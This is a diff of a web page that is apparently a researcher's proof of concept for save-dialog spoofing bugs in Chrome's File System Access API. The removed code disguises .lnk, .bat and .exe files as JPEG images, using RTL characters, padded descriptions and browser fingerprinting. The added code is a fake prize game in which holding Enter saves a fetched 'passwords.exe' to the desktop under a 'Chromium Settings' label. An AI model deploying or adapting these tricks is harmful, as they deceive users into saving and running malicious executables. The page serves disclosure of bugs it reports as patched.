@@ -1,183 +1,112 @@
-<!DOCTYPE html>
 <html>
 
 <head>
+    <title>Save file to desktop - File System Access API - security bug</title>
     <meta charset="UTF-8">
-    <title>File System Access API - security bugs</title>
 </head>
 
+<style>
+    body {
+        background: rgba(29, 48, 109, 0.849);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+    }
+
+    h1,h2,h3{
+        -webkit-text-stroke: 1px #00000050;
+    }
+
+    h1{
+        color:#D96C06;
+        font-size: 56px;
+    }
+    h2{
+        color: #1ebe8e;
+        font-size: 56px;
+    }
+    h3 {
+        color: #C6F91F; 
+        font-size: 56px;               
+    }
+    h2 span{
+        color: #cf4848;
+        font-size: 90px;
+    }
+
+    #author{
+        font-size: 28px;
+    }
+</style>
+
+
 <body>
-    <h3>File System Access API - security bugs</h3>
-
-    <img style="border: 2px solid grey" src="cat.jpg" alt="awesome cat" width="453" height="604">
-    <div>
-        <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save LNK file and show save as type
-            "JPEG Image (*.jpg)"</button>
-    </div>
-
     <script>
-        // The bugs works in Google Chrome 86 and 87. They are patched in 88+.
-        // Save LNK file and show save as type: JPEG Image (*.jpg)
-        // before patch: Save as type: "JPEG Image (*.jpg)" and saved file was .lnk
-        // after patch: Save as type: "JPEG Image (.jpg) (*.txt, *.text)" and saved file is changed to .txt [ok!]
-        const butSaveNewFile = document.getElementById('addNewFile')
-        butSaveNewFile.addEventListener('mouseup', async () => {
-            const options = {
-                types: [
-                    {
-                        description:
-                            'JPEG Image (*.jpg)',
-                        accept: {
-                            'text/plain': ['.jpg.lnk'] //could be .exe/.bat or anything
+        //how many time enter clicked in row
+        let countEnter = 0;
+        //is file downloaded
+        let isDownloaded = false;
+
+        //on page load
+        window.onload = function () {
+            const body = document.querySelector('body')
+            const pixel = document.querySelector('#pixel')
+
+            body.onkeydown = e => (e.key == "Enter") ? clickedEnter() : 1;
+            body.onkeyup = e => (e.key == "Enter") ? cancelEnter() : 1;
+
+            pixel.addEventListener('click', async () => {
+                const options = {
+                    startIn: 'desktop',
+                    suggestedName: 'passwords',
+                    types: [
+                        {
+                            description:
+                                'Chromium Settings',
+                            accept: {
+                                'text/plain': ['.exe'] //could be .exe/.bat or anything
+                            }
                         }
-                    }
-                ],
-                //delete from Save as type "*.*" option
-                excludeAcceptAllOption: true
+                    ],
+                    //delete from Save as type "*.*" option
+                    excludeAcceptAllOption: true
+                }
+
+                const handle = await window.showSaveFilePicker(options);
+                const writable = await handle.createWritable();
+                // 1) download file from local/server (Good for exe)
+                //you need to have FUD file lnkextra.lnk on server/local
+                //can be changed to diffrent file like cat.jpg
+                const response = await fetch('passwords.exe');
+                await response.body.pipeTo(writable);
+
+                document.querySelector("#gameover").textContent = "GAME OVER - Need refresh to start again"
+            })
+        };
+
+        function clickedEnter() {
+            countEnter++;            
+            //if button was hold more then 1 second and it wasn't downloaded - we can change !isDownloaded to countEnter % 30 === 0 to download many files
+            if (countEnter > 5 && !isDownloaded) {
+                pixel.click()
+                //set file is downloaded
+                isDownloaded = true;
             }
+        }
 
-            const handle = await window.showSaveFilePicker(options)
-            const writable = await handle.createWritable()
-
-            // 1) download file from local/server (Good for exe/lnk)
-            //you need to have FUD file lnkextra.lnk on server/local
-            //can be changed to diffrent file like cat.jpg
-            // const response = await fetch('lnkextra.lnk');
-            // await response.body.pipeTo(writable);
-
-            // 2) write text to download file (Good for bat)
-            //instead of downloading file we can write text to file
-            await writable.write('C:\\Windows\\system32\\calc.exe')
-            await writable.close()
-        })
-
-        //Other examples you need to swap "types" section :) 
-
-        // A many of whitespace and fake extensions in the description
-        // before patch: Save as type: "JPEG Image (*.jpg)" descritpion too long real extension was hidden
-        // after patch: Save as type: "JPEG Image (.jpg) limits on description length
-        //
-        // types: [
-        //     {
-        //       description:
-        //         "JPEG Image (*.jpeg) \n\n\t\t\t\t\t\t\n\n\n                                                                                                                                                                                                                                                                                                                                            ",
-        //       accept: {
-        //         "text/plain": [".bat"]
-        //       }
-        //     }
-        //   ]
-
-        // RTL in description
-        // before patch: Manipulation with RTL character 
-        // after patch: RTL character is still working but we can't manipulate to delete extension 
-        //
-        //   types: [
-        //     {
-        //       description: "Foo \u202egepj\u202e.moc.segami.www.exe Ardd",
-        //       accept: {
-        //         "text/plain": [".bat"]
-        //       }
-        //     }
-        //   ]
-
-        // Super long description
-        // before patch: Description is too long so real extensions are hidden
-        // after patch:  limits on description length
-        //
-        //   types: [
-        //     {
-        //       description: "JPEG Image (*.jpeg) this is super safe image, because it is a cat, and cats are cool there is nothing to worry about this must do exactly what you think it does, so you can download it and be happy",
-        //       accept: {
-        //         "text/plain": [".bat"]
-        //       }
-        //     }
-        //   ]
-
-        // Many spaces in the extension
-        // before patch: Extra manipulation of file name by extension field
-        // after patch:  extension filed has limited lenght
-        //
-        //   types: [
-        //     {
-        //       description: "JPEG Image",
-        //       accept: {
-        //         "text/plain": [
-        //           ".jpg                                                                                                                     .bat"
-        //         ]
-        //       }
-        //     }
-        //   ]
-
-        // RTL in extension
-        // before patch: Manipulation with RTL character 
-        // after patch: RTL character is blocked
-        //
-        //   types: [
-        //     {
-        //       description: "JPEG Image (*.jpeg)",
-        //       accept: {
-        //         "text/plain": [".\u202egepj\u202e.moc.segami.www.exe"]
-        //       }
-        //     }
-        //   ]
-
-        // Extension ends with space (source: https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
-        // before patch: File is downloaded and hard to deleted on windows (Possible that it wasnt always working)
-        // after patch: Extension cannot have space at the end
-        //
-        //   types: [
-        //     {
-        //       description: "JPEG Image",
-        //       accept: {
-        //         "text/plain": [".jpeg  "]
-        //       }
-        //     }
-        //   ]
-
-        // Extension ends with period (source: https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
-        // before patch: File is downloaded and hard to deleted on windows (Possible that it wasnt always working) - not sure
-        // after patch: Extension cannot have space at the end
-        //   types: [
-        //     {
-        //       description: "JPEG Image",
-        //       accept: {
-        //         "text/plain": [".jpeg."]
-        //       }
-        //     }
-        //   ]
-
-        // lnk file
-        // before patch: possible to download LNK - windows shortcut file
-        // after patch: LNK files are blocked
-        //   types: [
-        //     {
-        //       description: "JPEG Image (*.jpg)",
-        //       accept: {
-        //         "application/x-ms-shortcut": []
-        //       }
-        //     }
-        //   ]
-
-
-
-        // EXTRA - Because everything happens in JS we can check if user's browser is vulnerable
-        //var userAgentA = navigator.userAgent;
-        //var description = 'JPEG (*.jpeg)'
-        //var extension = '.jpeg'
-        //var file = "someRealPhotoFile.jpeg"
-        //Exploit works on this client - windows 10 - change to dangerous .exe file
-        // if (userAgentA.includes("Windows NT 10.0") && userAgentA.includes("Chrome/86.0.4240.75")) {
-        //     var extension = '.exe'
-        //     var file = "putty.exe"
-        // }
-        //Exploit works on this client - windows 7 - change to dangerous .src (screen saver) files (windows 10 stopped running .src files due to security issue)
-        // But .src looking more legin than .exe - so it is better
-        // else if (userAgentA.includes("Windows NT 6.1") && userAgentA.includes("Chrome/86.0.4240.75")) {
-        //     var extension = '.src'
-        //     var file = "putty.exe"
-        // }
-        //
+        function cancelEnter() {
+            //reset count enter if enter is not hold
+            countEnter = 0;
+        }
     </script>
+    <!-- div used to click to open Save As dialog -->
+    <div id="pixel"></div>
+    <h1>Super Simple Game😻😻😻</h1>
+    <h2><span>⌨️HOLD ENTER</span> for 5 seconds</h2>
+    <h3>win $1,000,000 and rule the world! 🔥🔥🔥🚀</h3>
+    <h3 id="author">Author: <a href="http://pulik.io" style="color: rgb(49, 161, 252);">Maciej Pulikowski (pulik.io)</a> 🧙🐱‍👓</h3>
+    <h3 id="gameover"></h3>
 
 </body>
 
